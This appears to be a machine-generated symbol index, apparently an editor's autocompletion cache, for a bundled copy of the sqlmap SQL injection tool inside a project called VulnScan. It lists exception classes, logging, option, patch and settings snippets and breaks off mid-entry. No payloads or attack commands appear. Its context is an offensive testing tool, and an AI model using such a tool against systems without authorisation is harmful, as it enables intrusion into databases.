        "peekOfCode": "class SqlmapNoneDataException(SqlmapBaseException):\n    pass\nclass SqlmapNotVulnerableException(SqlmapBaseException):\n    pass\nclass SqlmapSilentQuitException(SqlmapBaseException):\n    pass\nclass SqlmapUserQuitException(SqlmapBaseException):\n    pass\nclass SqlmapShellQuitException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapNotVulnerableException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapNotVulnerableException(SqlmapBaseException):\n    pass\nclass SqlmapSilentQuitException(SqlmapBaseException):\n    pass\nclass SqlmapUserQuitException(SqlmapBaseException):\n    pass\nclass SqlmapShellQuitException(SqlmapBaseException):\n    pass\nclass SqlmapSkipTargetException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSilentQuitException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapSilentQuitException(SqlmapBaseException):\n    pass\nclass SqlmapUserQuitException(SqlmapBaseException):\n    pass\nclass SqlmapShellQuitException(SqlmapBaseException):\n    pass\nclass SqlmapSkipTargetException(SqlmapBaseException):\n    pass\nclass SqlmapSyntaxException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUserQuitException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapUserQuitException(SqlmapBaseException):\n    pass\nclass SqlmapShellQuitException(SqlmapBaseException):\n    pass\nclass SqlmapSkipTargetException(SqlmapBaseException):\n    pass\nclass SqlmapSyntaxException(SqlmapBaseException):\n    pass\nclass SqlmapSystemException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapShellQuitException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapShellQuitException(SqlmapBaseException):\n    pass\nclass SqlmapSkipTargetException(SqlmapBaseException):\n    pass\nclass SqlmapSyntaxException(SqlmapBaseException):\n    pass\nclass SqlmapSystemException(SqlmapBaseException):\n    pass\nclass SqlmapThreadException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSkipTargetException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapSkipTargetException(SqlmapBaseException):\n    pass\nclass SqlmapSyntaxException(SqlmapBaseException):\n    pass\nclass SqlmapSystemException(SqlmapBaseException):\n    pass\nclass SqlmapThreadException(SqlmapBaseException):\n    pass\nclass SqlmapTokenException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSyntaxException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapSyntaxException(SqlmapBaseException):\n    pass\nclass SqlmapSystemException(SqlmapBaseException):\n    pass\nclass SqlmapThreadException(SqlmapBaseException):\n    pass\nclass SqlmapTokenException(SqlmapBaseException):\n    pass\nclass SqlmapUndefinedMethod(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapSystemException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapSystemException(SqlmapBaseException):\n    pass\nclass SqlmapThreadException(SqlmapBaseException):\n    pass\nclass SqlmapTokenException(SqlmapBaseException):\n    pass\nclass SqlmapUndefinedMethod(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapThreadException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapThreadException(SqlmapBaseException):\n    pass\nclass SqlmapTokenException(SqlmapBaseException):\n    pass\nclass SqlmapUndefinedMethod(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapTokenException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapTokenException(SqlmapBaseException):\n    pass\nclass SqlmapUndefinedMethod(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass\nclass SqlmapValueException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUndefinedMethod",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapUndefinedMethod(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass\nclass SqlmapValueException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedDBMSException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass\nclass SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass\nclass SqlmapValueException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapUnsupportedFeatureException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass\nclass SqlmapValueException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "SqlmapValueException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.exception",
        "description": "VulnScan.modules.sqlmap.lib.core.exception",
        "peekOfCode": "class SqlmapValueException(SqlmapBaseException):\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.exception",
        "documentation": {}
    },
    {
        "label": "runGui",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.gui",
        "description": "VulnScan.modules.sqlmap.lib.core.gui",
        "peekOfCode": "def runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox\n    except ImportError as ex:\n        raise SqlmapMissingDependence(\"missing dependence ('%s')\" % getSafeExString(ex))\n    # Reference: https://www.reddit.com/r/learnpython/comments/985umy/limit_user_input_to_only_int_with_tkinter/e4dj9k9?utm_source=share&utm_medium=web2x\n    class ConstrainedEntry(_tkinter.Entry):",
        "detail": "VulnScan.modules.sqlmap.lib.core.gui",
        "documentation": {}
    },
    {
        "label": "alive",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.gui",
        "description": "VulnScan.modules.sqlmap.lib.core.gui",
        "peekOfCode": "alive = None\nline = \"\"\nprocess = None\nqueue = None\ndef runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox",
        "detail": "VulnScan.modules.sqlmap.lib.core.gui",
        "documentation": {}
    },
    {
        "label": "line",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.gui",
        "description": "VulnScan.modules.sqlmap.lib.core.gui",
        "peekOfCode": "line = \"\"\nprocess = None\nqueue = None\ndef runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox\n    except ImportError as ex:",
        "detail": "VulnScan.modules.sqlmap.lib.core.gui",
        "documentation": {}
    },
    {
        "label": "process",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.gui",
        "description": "VulnScan.modules.sqlmap.lib.core.gui",
        "peekOfCode": "process = None\nqueue = None\ndef runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox\n    except ImportError as ex:\n        raise SqlmapMissingDependence(\"missing dependence ('%s')\" % getSafeExString(ex))",
        "detail": "VulnScan.modules.sqlmap.lib.core.gui",
        "documentation": {}
    },
    {
        "label": "queue",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.gui",
        "description": "VulnScan.modules.sqlmap.lib.core.gui",
        "peekOfCode": "queue = None\ndef runGui(parser):\n    try:\n        from thirdparty.six.moves import tkinter as _tkinter\n        from thirdparty.six.moves import tkinter_scrolledtext as _tkinter_scrolledtext\n        from thirdparty.six.moves import tkinter_ttk as _tkinter_ttk\n        from thirdparty.six.moves import tkinter_messagebox as _tkinter_messagebox\n    except ImportError as ex:\n        raise SqlmapMissingDependence(\"missing dependence ('%s')\" % getSafeExString(ex))\n    # Reference: https://www.reddit.com/r/learnpython/comments/985umy/limit_user_input_to_only_int_with_tkinter/e4dj9k9?utm_source=share&utm_medium=web2x",
        "detail": "VulnScan.modules.sqlmap.lib.core.gui",
        "documentation": {}
    },
    {
        "label": "LOGGER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.log",
        "description": "VulnScan.modules.sqlmap.lib.core.log",
        "peekOfCode": "LOGGER = logging.getLogger(\"sqlmapLog\")\nLOGGER_HANDLER = None\ntry:\n    from thirdparty.ansistrm.ansistrm import ColorizingStreamHandler\n    class _ColorizingStreamHandler(ColorizingStreamHandler):\n        def colorize(self, message, levelno, force=False):\n            if levelno in self.level_map and (self.is_tty or force):\n                bg, fg, bold = self.level_map[levelno]\n                params = []\n                if bg in self.color_map:",
        "detail": "VulnScan.modules.sqlmap.lib.core.log",
        "documentation": {}
    },
    {
        "label": "LOGGER_HANDLER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.log",
        "description": "VulnScan.modules.sqlmap.lib.core.log",
        "peekOfCode": "LOGGER_HANDLER = None\ntry:\n    from thirdparty.ansistrm.ansistrm import ColorizingStreamHandler\n    class _ColorizingStreamHandler(ColorizingStreamHandler):\n        def colorize(self, message, levelno, force=False):\n            if levelno in self.level_map and (self.is_tty or force):\n                bg, fg, bold = self.level_map[levelno]\n                params = []\n                if bg in self.color_map:\n                    params.append(str(self.color_map[bg] + 40))",
        "detail": "VulnScan.modules.sqlmap.lib.core.log",
        "documentation": {}
    },
    {
        "label": "FORMATTER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.log",
        "description": "VulnScan.modules.sqlmap.lib.core.log",
        "peekOfCode": "FORMATTER = logging.Formatter(\"\\r[%(asctime)s] [%(levelname)s] %(message)s\", \"%H:%M:%S\")\nLOGGER_HANDLER.setFormatter(FORMATTER)\nLOGGER.addHandler(LOGGER_HANDLER)\nLOGGER.setLevel(logging.INFO)",
        "detail": "VulnScan.modules.sqlmap.lib.core.log",
        "documentation": {}
    },
    {
        "label": "setVerbosity",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "def setVerbosity():\n    \"\"\"\n    This function set the verbosity of sqlmap output messages.\n    \"\"\"\n    if conf.verbose is None:\n        conf.verbose = 1\n    conf.verbose = int(conf.verbose)\n    if conf.verbose == 0:\n        logger.setLevel(logging.ERROR)\n    elif conf.verbose == 1:",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "initOptions",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "def initOptions(inputOptions=AttribDict(), overrideOptions=False):\n    _setConfAttributes()\n    _setKnowledgeBaseAttributes()\n    _mergeOptions(inputOptions, overrideOptions)\ndef init():\n    \"\"\"\n    Set attributes into both configuration and knowledge base singletons\n    based upon command line and configuration file options.\n    \"\"\"\n    _useWizardInterface()",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "init",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "def init():\n    \"\"\"\n    Set attributes into both configuration and knowledge base singletons\n    based upon command line and configuration file options.\n    \"\"\"\n    _useWizardInterface()\n    setVerbosity()\n    _saveConfig()\n    _setRequestFromFile()\n    _cleanupOptions()",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "authHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "authHandler = _urllib.request.BaseHandler()\nchunkedHandler = ChunkedHandler()\nhttpsHandler = HTTPSHandler()\nkeepAliveHandler = keepalive.HTTPHandler()\nproxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "chunkedHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "chunkedHandler = ChunkedHandler()\nhttpsHandler = HTTPSHandler()\nkeepAliveHandler = keepalive.HTTPHandler()\nproxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "httpsHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "httpsHandler = HTTPSHandler()\nkeepAliveHandler = keepalive.HTTPHandler()\nproxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "keepAliveHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "keepAliveHandler = keepalive.HTTPHandler()\nproxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "proxyHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "proxyHandler = _urllib.request.ProxyHandler()\nredirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None\ndef _loadQueries():",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "redirectHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "redirectHandler = SmartRedirectHandler()\nrangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None\ndef _loadQueries():\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "rangeHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "rangeHandler = HTTPRangeHandler()\nmultipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None\ndef _loadQueries():\n    \"\"\"\n    Loads queries from 'xml/queries.xml' file.",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "multipartPostHandler",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.option",
        "description": "VulnScan.modules.sqlmap.lib.core.option",
        "peekOfCode": "multipartPostHandler = multipartpost.MultipartPostHandler()\n# Reference: https://mail.python.org/pipermail/python-list/2009-November/558615.html\ntry:\n    WindowsError\nexcept NameError:\n    WindowsError = None\ndef _loadQueries():\n    \"\"\"\n    Loads queries from 'xml/queries.xml' file.\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.option",
        "documentation": {}
    },
    {
        "label": "optDict",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.optiondict",
        "description": "VulnScan.modules.sqlmap.lib.core.optiondict",
        "peekOfCode": "optDict = {\n    # Family: {\"parameter name\": \"parameter datatype\"},\n    # --OR--\n    # Family: {\"parameter name\": (\"parameter datatype\", \"category name used for common outputs feature\")},\n    \"Target\": {\n        \"direct\": \"string\",\n        \"url\": \"string\",\n        \"logFile\": \"string\",\n        \"bulkFile\": \"string\",\n        \"requestFile\": \"string\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.optiondict",
        "documentation": {}
    },
    {
        "label": "dirtyPatches",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.patch",
        "description": "VulnScan.modules.sqlmap.lib.core.patch",
        "peekOfCode": "def dirtyPatches():\n    \"\"\"\n    Place for \"dirty\" Python related patches\n    \"\"\"\n    # accept overly long result lines (e.g. SQLi results in HTTP header responses)\n    _http_client._MAXLINE = 1 * 1024 * 1024\n    # prevent double chunked encoding in case of sqlmap chunking (Note: Python3 does it automatically if 'Content-length' is missing)\n    if six.PY3:\n        if not hasattr(_http_client.HTTPConnection, \"__send_output\"):\n            _http_client.HTTPConnection.__send_output = _http_client.HTTPConnection._send_output",
        "detail": "VulnScan.modules.sqlmap.lib.core.patch",
        "documentation": {}
    },
    {
        "label": "resolveCrossReferences",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.patch",
        "description": "VulnScan.modules.sqlmap.lib.core.patch",
        "peekOfCode": "def resolveCrossReferences():\n    \"\"\"\n    Place for cross-reference resolution\n    \"\"\"\n    lib.core.threads.isDigit = isDigit\n    lib.core.threads.readInput = readInput\n    lib.core.common.getPageTemplate = getPageTemplate\n    lib.core.convert.filterNone = filterNone\n    lib.core.convert.isListLike = isListLike\n    lib.core.convert.shellExec = shellExec",
        "detail": "VulnScan.modules.sqlmap.lib.core.patch",
        "documentation": {}
    },
    {
        "label": "pympTempLeakPatch",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.patch",
        "description": "VulnScan.modules.sqlmap.lib.core.patch",
        "peekOfCode": "def pympTempLeakPatch(tempDir):\n    \"\"\"\n    Patch for \"pymp\" leaking directories inside Python3\n    \"\"\"\n    try:\n        import multiprocessing.util\n        multiprocessing.util.get_temp_dir = lambda: tempDir\n    except:\n        pass\ndef unisonRandom():",
        "detail": "VulnScan.modules.sqlmap.lib.core.patch",
        "documentation": {}
    },
    {
        "label": "unisonRandom",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.patch",
        "description": "VulnScan.modules.sqlmap.lib.core.patch",
        "peekOfCode": "def unisonRandom():\n    \"\"\"\n    Unifying random generated data across different Python versions\n    \"\"\"\n    def _lcg():\n        global _rand\n        a = 1140671485\n        c = 128201163\n        m = 2 ** 24\n        _rand = (a * _rand + c) % m",
        "detail": "VulnScan.modules.sqlmap.lib.core.patch",
        "documentation": {}
    },
    {
        "label": "_rand",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.patch",
        "description": "VulnScan.modules.sqlmap.lib.core.patch",
        "peekOfCode": "_rand = 0\ndef dirtyPatches():\n    \"\"\"\n    Place for \"dirty\" Python related patches\n    \"\"\"\n    # accept overly long result lines (e.g. SQLi results in HTTP header responses)\n    _http_client._MAXLINE = 1 * 1024 * 1024\n    # prevent double chunked encoding in case of sqlmap chunking (Note: Python3 does it automatically if 'Content-length' is missing)\n    if six.PY3:\n        if not hasattr(_http_client.HTTPConnection, \"__send_output\"):",
        "detail": "VulnScan.modules.sqlmap.lib.core.patch",
        "documentation": {}
    },
    {
        "label": "profile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.profiling",
        "description": "VulnScan.modules.sqlmap.lib.core.profiling",
        "peekOfCode": "def profile(profileOutputFile=None):\n    \"\"\"\n    This will run the program and present profiling data in a nice looking graph\n    \"\"\"\n    if profileOutputFile is None:\n        profileOutputFile = os.path.join(paths.SQLMAP_OUTPUT_PATH, \"sqlmap_profile.raw\")\n    if os.path.exists(profileOutputFile):\n        os.remove(profileOutputFile)\n    # Start sqlmap main function and generate a raw profile file\n    cProfile.run(\"start()\", profileOutputFile)",
        "detail": "VulnScan.modules.sqlmap.lib.core.profiling",
        "documentation": {}
    },
    {
        "label": "_readline",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "description": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "peekOfCode": "_readline = None\ntry:\n    from readline import *\n    import readline as _readline\nexcept:\n    try:\n        from pyreadline import *\n        import pyreadline as _readline\n    except:\n        pass",
        "detail": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "documentation": {}
    },
    {
        "label": "uses_libedit",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "description": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "peekOfCode": "uses_libedit = False\nif PLATFORM == \"mac\" and _readline:\n    import commands\n    (status, result) = commands.getstatusoutput(\"otool -L %s | grep libedit\" % _readline.__file__)\n    if status == 0 and len(result) > 0:\n        # We are bound to libedit - new in Leopard\n        _readline.parse_and_bind(\"bind ^I rl_complete\")\n        debugMsg = \"Leopard libedit detected when using platform's \"\n        debugMsg += \"readline library\"\n        logger.debug(debugMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.core.readlineng",
        "documentation": {}
    },
    {
        "label": "Replication",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.replication",
        "description": "VulnScan.modules.sqlmap.lib.core.replication",
        "peekOfCode": "class Replication(object):\n    \"\"\"\n    This class holds all methods/classes used for database\n    replication purposes.\n    \"\"\"\n    def __init__(self, dbpath):\n        try:\n            self.dbpath = dbpath\n            self.connection = sqlite3.connect(dbpath)\n            self.connection.isolation_level = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.replication",
        "documentation": {}
    },
    {
        "label": "getRevisionNumber",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.revision",
        "description": "VulnScan.modules.sqlmap.lib.core.revision",
        "peekOfCode": "def getRevisionNumber():\n    \"\"\"\n    Returns abbreviated commit hash number as retrieved with \"git rev-parse --short HEAD\"\n    >>> len(getRevisionNumber() or (' ' * 7)) == 7\n    True\n    \"\"\"\n    retVal = None\n    filePath = None\n    _ = os.path.dirname(__file__)\n    while True:",
        "detail": "VulnScan.modules.sqlmap.lib.core.revision",
        "documentation": {}
    },
    {
        "label": "setDbms",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.session",
        "description": "VulnScan.modules.sqlmap.lib.core.session",
        "peekOfCode": "def setDbms(dbms):\n    \"\"\"\n    @param dbms: database management system to be set into the knowledge\n    base as fingerprint.\n    @type dbms: C{str}\n    \"\"\"\n    hashDBWrite(HASHDB_KEYS.DBMS, dbms)\n    _ = \"(%s)\" % ('|'.join(SUPPORTED_DBMS))\n    _ = re.search(r\"\\A%s( |\\Z)\" % _, dbms, re.I)\n    if _:",
        "detail": "VulnScan.modules.sqlmap.lib.core.session",
        "documentation": {}
    },
    {
        "label": "setOs",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.session",
        "description": "VulnScan.modules.sqlmap.lib.core.session",
        "peekOfCode": "def setOs():\n    \"\"\"\n    Example of kb.bannerFp dictionary:\n    {\n      'sp': set(['Service Pack 4']),\n      'dbmsVersion': '8.00.194',\n      'dbmsServicePack': '0',\n      'distrib': set(['2000']),\n      'dbmsRelease': '2000',\n      'type': set(['Windows'])",
        "detail": "VulnScan.modules.sqlmap.lib.core.session",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERSION = \"1.7.1.4\"\nTYPE = \"dev\" if VERSION.count('.') > 2 and VERSION.split('.')[-1] != '0' else \"stable\"\nTYPE_COLORS = {\"dev\": 33, \"stable\": 90, \"pip\": 34}\nVERSION_STRING = \"sqlmap/%s#%s\" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)\nDESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TYPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TYPE = \"dev\" if VERSION.count('.') > 2 and VERSION.split('.')[-1] != '0' else \"stable\"\nTYPE_COLORS = {\"dev\": 33, \"stable\": 90, \"pip\": 34}\nVERSION_STRING = \"sqlmap/%s#%s\" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)\nDESCRIPTION = \"automatic SQL injection and database takeover tool\"\nSITE = \"https://sqlmap.org\"\nDEFAULT_USER_AGENT = \"%s (%s)\" % (VERSION_STRING, SITE)\nDEV_EMAIL_ADDRESS = \"dev@sqlmap.org\"\nISSUES_PAGE = \"https://github.com/sqlmapproject/sqlmap/issues/new\"\nGIT_REPOSITORY = \"https://github.com/sqlmapproject/sqlmap.git\"\nGIT_PAGE = \"https://github.com/sqlmapproject/sqlmap\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TYPE_COLORS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
